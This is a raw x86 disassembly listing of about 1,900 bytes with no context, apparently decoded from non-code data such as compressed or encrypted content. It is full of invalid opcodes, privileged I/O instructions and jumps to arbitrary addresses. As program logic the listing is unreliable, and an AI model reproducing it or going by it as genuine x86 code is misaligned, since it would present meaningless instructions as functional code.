  52c8d9:	jmp    0xb2b28116
  52c8de:	mov    al,0xac
  52c8e0:	js     0x52c8bb
  52c8e2:	addr16 pop ebx
  52c8e4:	sub    al,0x21
  52c8e6:	mov    ds,WORD PTR [ebx+0x7a82619c]
  52c8ec:	fdivr  QWORD PTR [edi]
  52c8ee:	pop    ds
  52c8ef:	pop    ss
  52c8f0:	cld    
  52c8f1:	pop    edi
  52c8f2:	add    al,al
  52c8f4:	shl    DWORD PTR [eax-0x5b07cf4b],0x26
  52c8fb:	pop    ebp
  52c8fc:	jle    0x52c955
  52c8fe:	ins    BYTE PTR es:[edi],dx
  52c8ff:	push   ds
  52c900:	pop    edx
  52c901:	xor    dl,bl
  52c903:	xchg   BYTE PTR [eax+0x1e],al
  52c906:	les    eax,FWORD PTR [eax+0x30]
  52c909:	cmc    
  52c90a:	push   edi
  52c90b:	or     eax,0xba6343c3
  52c910:	mov    ebx,0xae1f0f99
  52c915:	or     cl,BYTE PTR [edi-0x76c67e60]
  52c91b:	push   ebp
  52c91c:	mov    eax,0x2b71121
  52c921:	mov    ds:0xafdbb45,al
  52c926:	pop    ebp
  52c927:	test   DWORD PTR [ecx-0x56270645],edi
  52c92d:	mov    cl,0xa
  52c92f:	and    ebp,ecx
  52c931:	mov    ecx,0xaf41cab3
  52c936:	sahf   
  52c937:	inc    edi
  52c938:	sqrtps xmm4,XMMWORD PTR ss:[ecx-0x39e922a8]
  52c940:	sbb    eax,0xb093abe1
  52c945:	in     eax,0x1b
  52c947:	sub    cl,BYTE PTR [ecx-0x4430a56f]
  52c94d:	stc    
  52c94e:	test   eax,0x171501a
  52c953:	sub    edi,0xffffff8c
  52c956:	(bad)  
  52c957:	aas    
  52c958:	dec    edx
  52c959:	push   ecx
  52c95a:	dec    ebx
  52c95b:	leave  
  52c95c:	loope  0x52c927
  52c95e:	imul   esp,DWORD PTR [ecx-0x48],0x49
  52c962:	push   eax
  52c963:	dec    edx
  52c964:	inc    eax
  52c965:	xor    DWORD PTR [esi+0xa],0xffffffca
  52c969:	lods   al,BYTE PTR ds:[esi]
  52c96a:	scas   al,BYTE PTR es:[edi]
  52c96b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52c96c:	cmp    BYTE PTR [eax-0x2b6e3f33],0x86
  52c973:	stc    
  52c974:	sub    eax,0x38c916ca
  52c979:	inc    ebx
  52c97a:	xor    DWORD PTR [ebp+esi*1+0x17af17ff],eax
  52c981:	pop    ss
  52c982:	xlat   BYTE PTR ds:[ebx]
  52c983:	(bad)  
  52c984:	popa   
  52c985:	adc    ebp,esi
  52c987:	out    0x49,eax
  52c989:	repz and BYTE PTR [edx],cl
  52c98c:	out    0x4f,eax
  52c98e:	xor    eax,0xb16707fc
  52c993:	test   BYTE PTR [ebp+0x2f],ch
  52c996:	push   cs
  52c997:	or     ebx,DWORD PTR [ebp+0x1bc751a4]
  52c99d:	push   esi
  52c99e:	mov    bh,ah
  52c9a0:	xlat   BYTE PTR ds:[ebx]
  52c9a1:	(bad)  
  52c9a2:	mov    DWORD PTR [esi],esp
  52c9a4:	inc    esp
  52c9a5:	adc    DWORD PTR [eax+0x62d99eda],edx
  52c9ab:	stc    
  52c9ac:	sbb    bh,BYTE PTR [edx]
  52c9ae:	in     eax,dx
  52c9af:	popa   
  52c9b0:	mul    BYTE PTR [esi-0xb]
  52c9b3:	ror    DWORD PTR [ebp+0x4d],cl
  52c9b6:	jmp    0x52c9b8
  52c9b8:	out    0x1d,eax
  52c9ba:	outs   dx,DWORD PTR ds:[esi]
  52c9bb:	push   edx
  52c9bc:	mov    eax,ds:0xc983c0c6
  52c9c1:	mov    esp,0x4674ad8c
  52c9c6:	pop    esp
  52c9c7:	mov    ds:0x78dba67f,eax
  52c9cc:	rcl    DWORD PTR [ecx],0x19
  52c9cf:	ins    BYTE PTR es:[edi],dx
  52c9d0:	sbb    BYTE PTR [esi-0xe],ch
  52c9d3:	mov    ebx,0xf474c9b9
  52c9d8:	inc    ecx
  52c9d9:	pop    ss
  52c9da:	rol    ch,1
  52c9dc:	pop    edx
  52c9dd:	arpl   sp,dx
  52c9df:	push   edi
  52c9e0:	push   0xffffff84
  52c9e2:	jge    0x52c96e
  52c9e4:	jmp    0x52c98c
  52c9e6:	push   es
  52c9e7:	add    BYTE PTR [edi+eax*4-0x1a],dl
  52c9eb:	jns    0x52ca50
  52c9ed:	ret    0x96a
  52c9f0:	sbb    esp,DWORD PTR [ebx-0x77]
  52c9f3:	ds jecxz 0x52c991
  52c9f6:	mov    DWORD PTR [ecx+eiz*2+0x3da7541f],esi
  52c9fd:	or     al,0xca
  52c9ff:	mov    ds:0xd9072a88,al
  52ca04:	dec    edi
  52ca05:	adc    edx,esi
  52ca07:	mov    dl,0x9b
  52ca09:	sbb    al,0x7c
  52ca0b:	xchg   ebp,eax
  52ca0c:	jb     0x52ca05
  52ca0e:	mov    eax,ds:0x964e91e3
  52ca13:	push   es
  52ca14:	aad    0xa3
  52ca16:	sahf   
  52ca17:	in     al,dx
  52ca18:	das    
  52ca19:	test   bh,bh
  52ca1b:	inc    ebx
  52ca1c:	xchg   esp,eax
  52ca1d:	test   BYTE PTR [esi+esi*8],0xa2
  52ca21:	cld    
  52ca22:	sbb    bh,BYTE PTR [ebx-0x13]
  52ca25:	dec    ebp
  52ca26:	xor    esi,DWORD PTR [esi+0x6b62ea1e]
  52ca2c:	pop    edi
  52ca2d:	in     eax,dx
  52ca2e:	pushf  
  52ca2f:	cld    
  52ca30:	es or  eax,0xb48c1cca
  52ca36:	push   0x47e43aeb
  52ca3b:	in     al,0xd0
  52ca3d:	popf   
  52ca3e:	lods   eax,DWORD PTR ds:[esi]
  52ca3f:	push   cs
  52ca40:	mov    edx,0xb4603d9
  52ca45:	adc    esp,DWORD PTR [eax+0x49e3d3d1]
  52ca4b:	cmc    
  52ca4c:	inc    ebx
  52ca4d:	jae    0x52ca4d
  52ca4f:	fs xor al,0x45
  52ca52:	sar    DWORD PTR [ecx+0x320ec969],cl
  52ca58:	es int3 
  52ca5a:	push   edi
  52ca5b:	fst    QWORD PTR [edx+0x5089c493]
  52ca61:	sti    
  52ca62:	mov    eax,DWORD PTR [edi-0x7997127b]
  52ca68:	test   BYTE PTR [edi+0x75f06bad],dl
  52ca6e:	addr16 push ecx
  52ca70:	sub    ebx,DWORD PTR [edi+0x7a]
  52ca73:	ins    BYTE PTR es:[edi],dx
  52ca74:	or     esi,ecx
  52ca76:	xor    BYTE PTR [ecx],dh
  52ca78:	push   ss
  52ca79:	pop    esi
  52ca7a:	enter  0x98af,0x82
  52ca7e:	inc    ebp
  52ca7f:	xor    al,0x80
  52ca81:	sub    al,0x92
  52ca83:	sub    esi,ebx
  52ca85:	mov    eax,ds:0x94633873
  52ca8a:	sti    
  52ca8b:	(bad)  
  52ca8c:	cwde   
  52ca8d:	lea    ebx,[ecx+0x1e]
  52ca90:	imul   edi,esp,0x6720b6d5
  52ca96:	in     al,0x5a
  52ca98:	jmp    0x5395f2ac
  52ca9d:	xchg   esp,eax
  52ca9e:	sar    DWORD PTR [edx],1
  52caa0:	xchg   ebx,eax
  52caa1:	xor    edi,esi
  52caa3:	jp     0x52ca66
  52caa5:	xchg   BYTE PTR [edi-0x7d],al
  52caa8:	cld    
  52caa9:	and    DWORD PTR [ebx+0x581a3aad],ebx
  52caaf:	cmc    
  52cab0:	arpl   si,di
  52cab2:	sahf   
  52cab3:	popf   
  52cab4:	xchg   edx,eax
  52cab5:	mov    edi,0xcb9af757
  52caba:	pop    ebp
  52cabb:	daa    
  52cabc:	test   eax,0xa7245550
  52cac1:	inc    esp
  52cac2:	std    
  52cac3:	or     esp,DWORD PTR [esi+0x373ec0cb]
  52cac9:	stc    
  52caca:	sub    BYTE PTR ds:0x2d926c3f,0xe1
  52cad1:	loope  0x52cb34
  52cad3:	or     ecx,esi
  52cad5:	outs   dx,DWORD PTR ds:[esi]
  52cad6:	fs (bad) 
  52cad8:	mov    edx,0x46e48485
  52cadd:	push   edx
  52cade:	or     DWORD PTR [esi+0x6c],eax
  52cae1:	sbb    eax,0x42136fb7
  52cae7:	fist   WORD PTR [edx-0x211e45bd]
  52caed:	push   ss
  52caee:	addr16 xchg esp,esp
  52caf1:	dec    ebp
  52caf2:	push   DWORD PTR [edx-0x4fa2c382]
  52caf8:	inc    ecx
  52caf9:	lock ror cl,cl
  52cafc:	iret   
  52cafd:	fiadd  WORD PTR [ecx-0x74]
  52cb00:	jge    0x52cb7b
  52cb02:	je     0x52cae4
  52cb04:	nop
  52cb05:	mov    esp,eax
  52cb07:	mov    eax,0x67de098a
  52cb0c:	or     ah,BYTE PTR [eax+ebx*4]
  52cb0f:	cdq    
  52cb10:	inc    ecx
  52cb11:	fs sub al,0x17
  52cb14:	aaa    
  52cb15:	jo     0x52cad8
  52cb17:	push   edi
  52cb18:	inc    edx
  52cb19:	std    
  52cb1a:	push   ds
  52cb1b:	or     BYTE PTR [esi],bl
  52cb1d:	dec    edi
  52cb1e:	retf   
  52cb1f:	shr    DWORD PTR [ecx+0x177be5a8],0x14
  52cb26:	lock test DWORD PTR [eax-0x67],ebx
  52cb2a:	add    al,0x22
  52cb2c:	sbb    BYTE PTR [edx],al
  52cb2e:	int    0x3c
  52cb30:	dec    esi
  52cb31:	jbe    0x52cb91
  52cb33:	xchg   ebx,eax
  52cb34:	call   0xb1ec33fb
  52cb39:	mov    bh,0xca
  52cb3b:	jo     0x52cb44
  52cb3d:	(bad)  
  52cb3e:	adc    eax,0x709addd3
  52cb43:	outs   dx,DWORD PTR ds:[esi]
  52cb44:	bound  ecx,QWORD PTR [ecx-0x6c]
  52cb47:	adc    BYTE PTR [ebx-0xa237ad7],dl
  52cb4d:	lahf   
  52cb4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52cb4f:	ja     0x52cb3f
  52cb51:	xchg   ebx,eax
  52cb52:	rcl    ebp,0x50
  52cb55:	call   0x4dc66153
  52cb5a:	jp     0x52cb7d
  52cb5c:	inc    edi
  52cb5d:	repnz mov ds:0xa39afa18,eax
  52cb63:	cs jae 0x52cbd0
  52cb66:	push   esi
  52cb67:	outs   dx,BYTE PTR ds:[esi]
  52cb68:	ja     0x52cb98
  52cb6a:	sti    
  52cb6b:	push   eax
  52cb6c:	add    al,0x63
  52cb6e:	add    al,BYTE PTR [edi-0x7674cb03]
  52cb74:	fdivr  QWORD PTR [edx]
  52cb76:	cmp    edi,DWORD PTR [edi]
  52cb78:	xor    BYTE PTR [edx],0xc7
  52cb7b:	add    dh,BYTE PTR [ebx+0x613a070e]
  52cb81:	(bad)  
  52cb82:	push   ds
  52cb83:	jb     0x52cb3f
  52cb85:	xchg   edx,eax
  52cb86:	dec    esi
  52cb87:	or     ebx,DWORD PTR [esi-0x6f]
  52cb8a:	int3   
  52cb8b:	mov    ch,0x33
  52cb8d:	loopne 0x52cb75
  52cb8f:	push   ebx
  52cb90:	pop    ebx
  52cb91:	and    al,0x1e
  52cb93:	mov    ebx,0x907cbaf6
  52cb98:	jae    0x52cbae
  52cb9a:	xchg   BYTE PTR [edx-0x52],dl
  52cb9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52cb9e:	cld    
  52cb9f:	fneni(8087 only) 
  52cba1:	fdiv   st,st(2)
  52cba3:	mov    al,ds:0x7fbd0c49
  52cba8:	or     edx,DWORD PTR [ebx+0x252cfa45]
  52cbae:	int3   
  52cbaf:	imul   esi,edx,0x707f19d0
  52cbb5:	fs out 0xa,al
  52cbb8:	jbe    0x52cbd1
  52cbba:	test   ah,ch
  52cbbc:	neg    BYTE PTR [ecx]
  52cbbe:	xchg   BYTE PTR [ebx-0x42],cl
  52cbc1:	idiv   BYTE PTR [ebp+0x57709e79]
  52cbc7:	es (bad) 
  52cbc9:	jle    0x52cbc1
  52cbcb:	aas    
  52cbcc:	paddsb mm2,QWORD PTR [edx+0x68]
  52cbd0:	rol    cl,0x1b
  52cbd3:	xor    al,0x64
  52cbd5:	xchg   ebx,eax
  52cbd6:	or     eax,0x22d459c0
  52cbdb:	mov    WORD PTR [ebx+0x67],?
  52cbde:	data16 daa 
  52cbe0:	cmp    eax,0x652dec7b
  52cbe5:	adc    eax,0x5f0de465
  52cbea:	jecxz  0x52cba1
  52cbec:	dec    edi
  52cbed:	(bad)  
  52cbee:	daa    
  52cbef:	push   ebx
  52cbf0:	push   es
  52cbf1:	pop    es
  52cbf2:	(bad)  
  52cbf3:	jb     0x52cbf0
  52cbf5:	js     0x52cba3
  52cbf7:	(bad)  
  52cbf8:	out    0x50,eax
  52cbfa:	in     al,0x5c
  52cbfc:	xor    edx,ebp
  52cbfe:	jge    0x52cbef
  52cc00:	mov    eax,0xc8b69dde
  52cc05:	int    0x60
  52cc07:	fild   DWORD PTR [esi-0x13]
  52cc0a:	pop    esp
  52cc0b:	cmp    eax,0xb533406a
  52cc10:	ja     0x52cbe0
  52cc12:	cmp    DWORD PTR ds:0x580626f4,edx
  52cc18:	mov    BYTE PTR [ebx+0x8d71c1f],dh
  52cc1e:	cld    
  52cc1f:	(bad)  
  52cc20:	aad    0xc9
  52cc22:	(bad)  
  52cc23:	mov    al,BYTE PTR [edx+0x39]
  52cc26:	pusha  
  52cc27:	jle    0x52cc5b
  52cc29:	adc    eax,DWORD PTR [ecx+0x5]
  52cc2c:	mov    esi,0xb2c7029d
  52cc31:	sub    BYTE PTR [ecx],dh
  52cc33:	das    
  52cc34:	jns    0x52cc30
  52cc36:	adc    bl,dh
  52cc38:	xlat   BYTE PTR ds:[ebx]
  52cc39:	add    eax,0x29f8d3d0
  52cc3e:	lds    ecx,FWORD PTR [ebx+0x4ded1955]
  52cc44:	jns    0x52cc41
  52cc46:	mov    edi,0xbbe3b39d
  52cc4b:	cli    
  52cc4c:	mov    bl,0xab
  52cc4e:	sbb    DWORD PTR [eax-0x46],esp
  52cc51:	bound  ebx,QWORD PTR [eax]
  52cc53:	imul   esi,DWORD PTR [edi+0x37f287e1],0x0
  52cc5a:	or     eax,0xc4046b3e
  52cc5f:	or     eax,0x540be384
  52cc64:	lea    ecx,[ecx+ecx*2+0x26f59457]
  52cc6b:	fcom   DWORD PTR [edi+0x47]
  52cc6e:	ret    
  52cc6f:	pop    ss
  52cc70:	out    dx,al
  52cc71:	cwde   
  52cc72:	sub    BYTE PTR [esp+ebp*2],ah
  52cc75:	lds    esp,FWORD PTR [ecx-0x24]
  52cc78:	sbb    bh,ah
  52cc7a:	outs   dx,DWORD PTR ds:[esi]
  52cc7b:	fstp   QWORD PTR ds:0x27b48d9
  52cc81:	jae    0x52cc0e
  52cc83:	push   edx
  52cc84:	xchg   esp,eax
  52cc85:	jl     0x52cc1a
  52cc87:	scas   ax,WORD PTR es:[edi]
  52cc89:	pusha  
  52cc8a:	in     eax,dx
  52cc8b:	inc    ebx
  52cc8c:	cmp    BYTE PTR [edi+0x42c9d298],ch
  52cc92:	jae    0x52cca9
  52cc94:	sub    BYTE PTR [ebx],0xf6
  52cc97:	add    eax,0x9080e0fc
  52cc9c:	and    BYTE PTR ds:0x16d88403,cl
  52cca2:	jns    0x52ccf1
  52cca4:	ret    
  52cca5:	adc    BYTE PTR [ebx-0x3a41dc79],cl
  52ccab:	jns    0x52cce5
  52ccad:	xor    DWORD PTR [edi+0x74d28124],esi
  52ccb3:	fsub   QWORD PTR [ebx+0x430a4404]
  52ccb9:	or     eax,0x8e6aad95
  52ccbe:	sbb    BYTE PTR [eax+0x56906c63],cl
  52ccc4:	add    edx,DWORD PTR [eax]
  52ccc6:	int    0x7a
  52ccc8:	idiv   BYTE PTR [eax-0x3]
  52cccb:	pop    ds
  52cccc:	dec    ebp
  52cccd:	mov    WORD PTR [edx],?
  52cccf:	sbb    al,0xce
  52ccd1:	pop    ecx
  52ccd2:	or     cl,BYTE PTR fs:[ebp+0x46]
  52ccd6:	and    BYTE PTR [eax-0x5cd83701],dh
  52ccdc:	mov    BYTE PTR [eax],bl
  52ccde:	dec    ebp
  52ccdf:	dec    ebp
  52cce0:	pushf  
  52cce1:	mov    DWORD PTR [edi],0xf0c7b74d
  52cce7:	mov    dl,0xc3
  52cce9:	push   esi
  52ccea:	cmp    BYTE PTR [ecx],0x49
  52cced:	cmp    BYTE PTR [edi-0x4d],dl
  52ccf0:	jmp    0x52cd30
  52ccf2:	xchg   esi,eax
  52ccf3:	stos   DWORD PTR es:[edi],eax
  52ccf4:	fbstp  TBYTE PTR [ebp-0x1b]
  52ccf7:	xor    eax,0x93b3c1c4
  52ccfc:	and    eax,0xc08ee09
  52cd01:	cmc    
  52cd02:	adc    ah,ah
  52cd04:	mov    ds:0xcafa4698,al
  52cd09:	push   0x74e6599b
  52cd0e:	jb     0x52cd78
  52cd10:	xchg   esi,eax
  52cd11:	lahf   
  52cd12:	and    al,0xa0
  52cd14:	jb     0x52cd56
  52cd16:	mov    ch,0x49
  52cd18:	pop    ebp
  52cd19:	dec    esp
  52cd1a:	pop    es
  52cd1b:	rcr    DWORD PTR [eax+0x3f],0x22
  52cd1f:	sti    
  52cd20:	dec    ebx
  52cd21:	aas    
  52cd22:	iret   
  52cd23:	or     eax,0x3749da97
  52cd28:	jbe    0x52cd2e
  52cd2a:	imul   eax,DWORD PTR [ecx+0x260ad9cf],0x2c53ac7d
  52cd34:	(bad)  
  52cd35:	sub    BYTE PTR gs:[esi-0x37c6b9e2],bl
  52cd3c:	test   eax,0xffd37689
  52cd41:	dec    ebx
  52cd42:	mov    edi,esp
  52cd44:	fsubr  QWORD PTR [ecx-0x7d7bb25d]
  52cd4a:	sbb    esi,0x42
  52cd4d:	push   0x1a
  52cd4f:	pop    es
  52cd50:	inc    edi
  52cd51:	dec    edx
  52cd52:	lods   eax,DWORD PTR ds:[esi]
  52cd53:	and    cl,BYTE PTR [ebx-0x7ee3c8d0]
  52cd59:	icebp  
  52cd5a:	pop    edx
  52cd5b:	cwde   
  52cd5c:	sub    eax,0x7346ab82
  52cd61:	iret   
  52cd62:	mov    edx,0xd86ef9c7
  52cd67:	loop   0x52cd8a
  52cd69:	cmp    al,0x58
  52cd6b:	test   BYTE PTR [ebp-0x4],dh
  52cd6e:	add    esi,DWORD PTR [eax]
  52cd70:	dec    ecx
  52cd71:	mov    edx,0xbccfc168
  52cd76:	out    dx,al
  52cd77:	push   ds
  52cd78:	sub    eax,0x33df0ed4
  52cd7d:	dec    edi
  52cd7e:	das    
  52cd7f:	pop    esp
  52cd80:	jb     0x52cdd9
  52cd82:	push   ebp
  52cd83:	add    eax,0x67ac07cc
  52cd88:	or     DWORD PTR [ecx+ecx*2+0x3d],ecx
  52cd8c:	pushf  
  52cd8d:	and    BYTE PTR [esi-0x15],ah
  52cd90:	fisub  DWORD PTR [ebx]
  52cd92:	xor    bl,bh
  52cd94:	popf   
  52cd95:	push   edx
  52cd96:	test   al,0xe5
  52cd98:	mov    ebx,0x8bbcee0f
  52cd9d:	xchg   edi,eax
  52cd9e:	fist   WORD PTR [ebx+0x469399f4]
  52cda4:	cmp    ebp,esi
  52cda6:	clc    
  52cda7:	ret    0xffe
  52cdaa:	mov    bh,0xdd
  52cdac:	mov    ah,0x3e
  52cdae:	pop    ds
  52cdaf:	xor    DWORD PTR [edx],ebx
  52cdb1:	dec    esi
  52cdb2:	(bad)  
  52cdb3:	or     eax,0x7c33c268
  52cdb8:	lock retf 0x977e
  52cdbc:	pop    es
  52cdbd:	in     al,dx
  52cdbe:	sub    al,0xd9
  52cdc0:	push   eax
  52cdc1:	cmp    BYTE PTR [ebp+0x13fd762c],dh
  52cdc7:	(bad)  
  52cdc8:	and    BYTE PTR [ecx+0x39db7012],ah
  52cdce:	mov    dh,0xc8
  52cdd0:	(bad)  [esi-0xef0545e]
  52cdd6:	add    eax,0xdaaf991e
  52cddb:	or     ecx,eax
  52cddd:	dec    ecx
  52cdde:	pop    ds
  52cddf:	std    
  52cde0:	rol    DWORD PTR es:[eax+0xded2e0e],1
  52cde7:	jno    0x52ce20
  52cde9:	adc    ecx,edx
  52cdeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52cdec:	jmp    0x22ee1c1c
  52cdf1:	ret    0x9ae
  52cdf4:	clc    
  52cdf5:	call   0x9779:0x605
  52cdfb:	test   eax,0x47a50196
  52ce00:	hlt    
  52ce01:	dec    edx
  52ce02:	mov    ecx,0x7daa4844
  52ce07:	mov    ch,0xe
  52ce09:	arpl   WORD PTR [eax],ax
  52ce0b:	sar    DWORD PTR [ecx],cl
  52ce0d:	mov    al,ds:0x4ab87486
  52ce12:	xchg   BYTE PTR [edx-0x47],dl
  52ce15:	xor    al,0x92
  52ce17:	and    dl,BYTE PTR [esi]
  52ce19:	ja     0x52ce07
  52ce1b:	add    al,BYTE PTR [ecx]
  52ce1d:	dec    DWORD PTR [eax-0x5d1d9656]
  52ce23:	pop    esi
  52ce24:	repnz mov eax,ds:0x97e781a6
  52ce2a:	std    
  52ce2b:	dec    esi
  52ce2c:	popa   
  52ce2d:	mov    WORD PTR fs:[edi],gs
  52ce30:	push   0xfffffff5
  52ce32:	in     eax,0xd7
  52ce34:	loopne 0x52cdd8
  52ce36:	dec    edi
  52ce37:	sub    al,0x96
  52ce39:	pop    edi
  52ce3a:	pop    esp
  52ce3b:	js     0x52cdec
  52ce3d:	mov    ebx,ebx
  52ce3f:	arpl   WORD PTR [ebx-0x2cea1b19],di
  52ce45:	and    ah,BYTE PTR [edx*8-0x7b6a70dc]
  52ce4c:	neg    BYTE PTR [edi]
  52ce4e:	mov    ah,0x1e
  52ce50:	mov    eax,0x49d78cf2
  52ce55:	push   es
  52ce56:	sbb    BYTE PTR [edi+0x294b76dc],cl
  52ce5c:	fnop   
  52ce5e:	lods   eax,DWORD PTR ds:[esi]
  52ce5f:	jno    0x52ce11
  52ce61:	pop    eax
  52ce62:	sub    eax,0x8116489c
  52ce67:	inc    esp
  52ce68:	scas   al,BYTE PTR es:[edi]
  52ce69:	int3   
  52ce6a:	mov    eax,ds:0xa549b9b9
  52ce6f:	aaa    
  52ce70:	cmp    ch,cl
  52ce72:	ds nop
  52ce74:	(bad)  
  52ce75:	adc    DWORD PTR [esi-0x2c],esp
  52ce78:	dec    esi
  52ce79:	scas   al,BYTE PTR es:[edi]
  52ce7a:	sahf   
  52ce7b:	mov    cs,WORD PTR [ecx-0x1f036ad6]
  52ce81:	shl    BYTE PTR [ebp+0x393c3d5],cl
  52ce87:	inc    edi
  52ce88:	or     dh,BYTE PTR [edi-0x5ea07242]
  52ce8e:	jmp    0xa967b894
  52ce93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52ce94:	mov    dl,0xe8
  52ce96:	mov    dl,0x9e
  52ce98:	mov    eax,ds:0xf171240a
  52ce9d:	call   0x6b84:0x8466d93b
  52cea4:	sub    bl,BYTE PTR [ebp+0x1]
  52cea7:	bound  edx,QWORD PTR [edi-0x16341fc2]
  52cead:	ror    DWORD PTR [esi-0x54803671],0x37
  52ceb4:	outs   dx,BYTE PTR ds:[esi]
  52ceb5:	push   edi
  52ceb6:	xchg   ebx,eax
  52ceb7:	lock scas eax,DWORD PTR es:[edi]
  52ceb9:	inc    edx
  52ceba:	ins    DWORD PTR es:[edi],dx
  52cebb:	fimul  WORD PTR [esi+0x18]
  52cebe:	fwait
  52cebf:	jmp    0x1f4a:0x3d84fe0f
  52cec6:	loop   0x52ce76
  52cec8:	pop    ebp
  52cec9:	hlt    
  52ceca:	xchg   edx,eax
  52cecb:	jge    0x52cf0a
  52cecd:	sbb    al,0x32
  52cecf:	or     eax,0x1aae6f26
  52ced4:	dec    ebx
  52ced5:	aam    0xc2
  52ced7:	sbb    DWORD PTR [ecx],esp
  52ced9:	ja     0x52ceba
  52cedb:	sbb    al,0x27
  52cedd:	sahf   
  52cede:	iret   
  52cedf:	pop    ds
  52cee0:	push   cs
  52cee1:	sub    DWORD PTR [ecx+0x69],edi
  52cee4:	pop    edi
  52cee5:	mov    esp,0x6b375305
  52ceea:	adc    eax,ebp
  52ceec:	push   edx
  52ceed:	xor    eax,0x188039e3
  52cef2:	loope  0x52cec4
  52cef4:	xchg   ebx,eax
  52cef5:	add    eax,0xc09896a2
  52cefa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52cefb:	pop    eax
  52cefc:	push   es
  52cefd:	pop    esp
  52cefe:	je     0x52ce9f
  52cf00:	pop    ebx
  52cf01:	cli    
  52cf02:	scas   al,BYTE PTR es:[edi]
  52cf03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52cf04:	jns    0x52ce97
  52cf06:	xchg   esi,eax
  52cf07:	add    ecx,DWORD PTR [esi]
  52cf09:	sahf   
  52cf0a:	(bad)  
  52cf0b:	push   edi
  52cf0c:	mov    esi,eax
  52cf0e:	int3   
  52cf0f:	adc    dl,BYTE PTR [ebx+0x6c]
  52cf12:	cmp    dh,BYTE PTR [edx-0x14]
  52cf15:	out    0xab,al
  52cf17:	fist   DWORD PTR ds:0x65ce1b59
  52cf1d:	aaa    
  52cf1e:	stc    
  52cf1f:	push   es
  52cf20:	push   es
  52cf21:	(bad)  
  52cf22:	xchg   esp,eax
  52cf23:	nop
  52cf24:	pop    edi
  52cf25:	cli    
  52cf26:	push   edx
  52cf27:	inc    esp
  52cf28:	out    0x2d,al
  52cf2a:	out    0x85,al
  52cf2c:	das    
  52cf2d:	scas   eax,DWORD PTR es:[edi]
  52cf2e:	scas   al,BYTE PTR es:[edi]
  52cf2f:	xor    ebx,DWORD PTR [esi-0x4eeb02eb]
  52cf35:	adc    ecx,DWORD PTR [esi]
  52cf37:	sub    al,0x82
  52cf39:	enter  0x103c,0xe8
  52cf3d:	in     al,0x17
  52cf3f:	xchg   ecx,eax
  52cf40:	push   es
  52cf41:	sub    ecx,edi
  52cf43:	add    al,BYTE PTR [ebx]
  52cf45:	dec    BYTE PTR [edx-0x51a88d15]
  52cf4b:	dec    ecx
  52cf4c:	mov    dh,0xf0
  52cf4e:	in     eax,0xaa
  52cf50:	sbb    esp,ebp
  52cf52:	lea    ecx,[ebx+eiz*4-0xe]
  52cf56:	inc    edx
  52cf57:	imul   eax,DWORD PTR [edi-0x38],0x17
  52cf5b:	mov    cl,BYTE PTR [ebx+0x3a58d02d]
  52cf61:	xor    al,BYTE PTR [esi]
  52cf63:	cmp    esi,DWORD PTR [esp+edx*8+0x12]
  52cf67:	fst    DWORD PTR [eax-0x47fc70dc]
  52cf6d:	push   edi
  52cf6e:	push   edi
  52cf6f:	mov    eax,esp
  52cf71:	xor    eax,0x83571146
  52cf76:	into   
  52cf77:	das    
  52cf78:	scas   eax,DWORD PTR es:[edi]
  52cf79:	out    0x90,al
  52cf7b:	nop
  52cf7c:	mov    dl,0x62
  52cf7e:	ret    
  52cf7f:	dec    esp
  52cf80:	inc    esp
  52cf81:	aaa    
  52cf82:	cwde   
  52cf83:	fstp   DWORD PTR [ebx]
  52cf85:	aad    0x9f
  52cf87:	jbe    0x52cfb5
  52cf89:	xchg   ebp,eax
  52cf8a:	sub    edi,0x6c
  52cf8d:	add    DWORD PTR [ebx],edi
  52cf8f:	aam    0xf0
  52cf91:	sahf   
  52cf92:	retf   0x2401
  52cf95:	test   al,0x66
  52cf97:	adc    BYTE PTR [ebx-0x23],0xe5
  52cf9b:	ret    0xa2b2
  52cf9e:	mov    BYTE PTR [ecx+0x51],bl
  52cfa1:	and    al,0xd6
  52cfa3:	push   edi
  52cfa4:	and    DWORD PTR [ebp+0x1c475347],0xfffffffc
  52cfab:	sbb    ebx,ebp
  52cfad:	or     al,0xf6
  52cfaf:	mov    ebx,0x2812aa5e
  52cfb4:	sub    BYTE PTR es:[esi],0xfa
  52cfb8:	and    DWORD PTR [edx-0x31e306ee],ebp
  52cfbe:	fs jno 0x52cf8f
  52cfc1:	enter  0x3d07,0x3a
  52cfc5:	jns    0x52cf73
  52cfc7:	dec    esi
  52cfc8:	push   ss
  52cfc9:	out    dx,al
  52cfca:	xor    BYTE PTR [edx+0x4c],0x2
  52cfce:	cmc    
  52cfcf:	fild   WORD PTR [eax+0x90aeb62]
  52cfd5:	inc    esp
  52cfd6:	xchg   esp,eax
  52cfd7:	sub    dl,dl
  52cfd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52cfda:	and    esi,DWORD PTR [edx+0x37ab4de1]
  52cfe0:	jne    0x52cfd7
  52cfe2:	aaa    
  52cfe3:	idiv   DWORD PTR ds:0x5cb1697c
  52cfe9:	out    dx,al
  52cfea:	cmp    ecx,DWORD PTR [eax*1-0x5b4a6166]
  52cff1:	mov    ecx,DWORD PTR [esi+0x44]
  52cff4:	push   esp
  52cff5:	aaa    
  52cff6:	sbb    ebp,DWORD PTR [eax-0x1b64f85c]
  52cffc:	sub    eax,0x2299f78b
  52d001:	pop    ebp
  52d002:	ret    0xca6d
  52d005:	ja     0x52cf8b
  52d007:	fs into 
  52d009:	ja     0x52d023
  52d00b:	fimul  DWORD PTR [ecx]
  52d00d:	mov    BYTE PTR [edx],cl
  52d00f:	and    al,0xd3
  52d011:	sbb    esp,DWORD PTR [ebp+0x9]
  52d014:	jno    0x52d009
  52d016:	sbb    al,0xdf
  52d018:	call   0x7c38b36e
  52d01d:	inc    esi
  52d01e:	mov    eax,0xca1d8930
  52d023:	gs lock ror dh,1
  52d027:	sbb    eax,0x19c1b458
  52d02c:	mov    dl,0x7d
  52d02e:	das    
  52d02f:	retf   
  52d030:	dec    esp
  52d031:	push   cs
  52d032:	push   eax
  52d033:	cli    
  52d034:	mov    cl,ch
  52d036:	out    dx,al
  52d037:	sub    esi,DWORD PTR [ebx-0x1f]
  52d03a:	gs push esi
  52d03c:	in     al,dx
  52d03d:	sub    DWORD PTR [edi],eax
  52d03f:	pop    esp
